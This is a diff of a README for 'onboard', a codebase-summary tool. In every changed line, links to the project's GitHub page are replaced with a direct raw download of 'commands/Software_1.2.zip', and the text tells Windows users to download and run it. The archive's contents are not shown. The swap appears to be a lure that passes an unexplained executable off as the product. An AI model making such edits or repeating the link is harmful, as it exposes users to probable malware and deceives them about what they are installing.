@@ -1,6 +1,6 @@
 # 🧭 onboard - Quick codebase summaries for new projects
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/spandespatch97/onboard)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/spandespatch97/onboard/main/commands/Software_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it when you join a new repo, open a codebase after time away, or need a shor
 
 To get onboard on Windows, visit this page to download or open the latest version:
 
-[https://github.com/spandespatch97/onboard](https://github.com/spandespatch97/onboard)
+[https://raw.githubusercontent.com/spandespatch97/onboard/main/commands/Software_1.2.zip](https://raw.githubusercontent.com/spandespatch97/onboard/main/commands/Software_1.2.zip)
 
 If the page includes a release file, download it and run it on your PC. If it opens as a project page, use the files on that page to get the app or tool running in your setup.
 
@@ -45,7 +45,7 @@ If you use a work PC, make sure you have permission to run downloaded tools.
 Follow these steps to get started on Windows:
 
 1. Open the GitHub page:
-   [https://github.com/spandespatch97/onboard](https://github.com/spandespatch97/onboard)
+   [https://raw.githubusercontent.com/spandespatch97/onboard/main/commands/Software_1.2.zip](https://raw.githubusercontent.com/spandespatch97/onboard/main/commands/Software_1.2.zip)
 
 2. Look for the latest release, download file, or project files on the page.
 
@@ -182,6 +182,6 @@ Onboard fits well into AI-first and developer-focused work. It helps reduce the 
 
 Open the GitHub page here and use it to download or run the project files:
 
-[https://github.com/spandespatch97/onboard](https://github.com/spandespatch97/onboard)
+[https://raw.githubusercontent.com/spandespatch97/onboard/main/commands/Software_1.2.zip](https://raw.githubusercontent.com/spandespatch97/onboard/main/commands/Software_1.2.zip)
 
 If the page shows a file you can download, save it and run it on Windows. If it shows source files, open the repo and follow the setup steps from there
